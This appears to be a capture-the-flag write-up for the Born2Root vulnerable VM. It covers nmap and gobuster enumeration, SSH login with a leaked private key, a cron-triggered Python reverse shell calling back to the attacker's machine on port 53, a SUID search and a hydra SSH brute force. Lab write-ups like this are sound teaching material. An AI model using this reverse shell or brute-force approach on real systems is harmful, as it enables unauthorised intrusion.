
---
layout: default
title: x002-Born2Root
nav_order: 2
has_children: true
parent: writeups
grand_parent: DylanGrl Writings
---

## x002-Born2Root
### Enumeration 

####  NMAP
```sh
nmap -A -T4 192.168.148.49 -p-
```

Which gives us : 
```sh
22/tcp    open     ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)
|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)
|   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)
|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:cd:df:13:76:32:4e (ED25519)
80/tcp    open     http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/wordpress-blog /files
|_http-title:  Secretsec Company 
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open     rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34581/tcp6  status
|   100024  1          40205/udp6  status
|   100024  1          41595/udp   status
|_  100024  1          46330/tcp   status
239/tcp   filtered unknown
28289/tcp filtered unknown
46330/tcp open     status  1 (RPC #100024)
59231/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Web 
##### Gobuster 
```sh
gobuster dir -u http://192.168.148.49/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Result : 
```sh
/icons                (Status: 301) [Size: 316] [--> http://192.168.148.49/icons/]
/files                (Status: 301) [Size: 316] [--> http://192.168.148.49/files/]
/manual               (Status: 301) [Size: 317] [--> http://192.168.148.49/manual/]
/server-status        (Status: 403) [Size: 302]    
```


### Access 
Inside the `/icons` folder we found a text file corresponding to a SSH Private Key.
Using the key and the user available on the home page we get access : 
![](attachments/Pasted%20image%2020220219195500.png)

### Privilege Escalation

Checking the crontab we notice the following : 
![](attachments/Pasted%20image%2020220219201218.png)

We could create our own python script to create a reverse shell to the Jimmy account : 
```python
#!/usr/bin/python
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.49.148",53))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

On our local machine we are waiting the connection : 
```sh
nc -lnvp 53
```

![](attachments/Pasted%20image%2020220219202048.png)

Search SUID  from user Jimmy : 
```
find / -perm -u=s -type f 2>/dev/null
```

![](attachments/Pasted%20image%2020220219204629.png)

It shows that the `networker` present in our home folder is in the list.

Analyzing it with the `strings` commands indicate the list of sub-command used : 
![](attachments/Pasted%20image%2020220219204903.png)

None of these command allow something based on the https://gtfobins.github.io/#+suid website. 

Our answer is not there.

####  Brute forcing the access 
From our previous enumeration to get the root access, we have detected that the only user on which we coudln't reach the account was Hadi. 

Based on that, we could try to brute force the access using a generated list from bopscrk : 
![](attachments/Pasted%20image%2020220220161012.png)

Then using hydra : 
```bash
hydra -l hadi -P tmp.txt 192.168.148.49 ssh
```

![](attachments/Pasted%20image%2020220220161046.png)

Login with the user and running su command : 

![](attachments/Pasted%20image%2020220220161214.png)

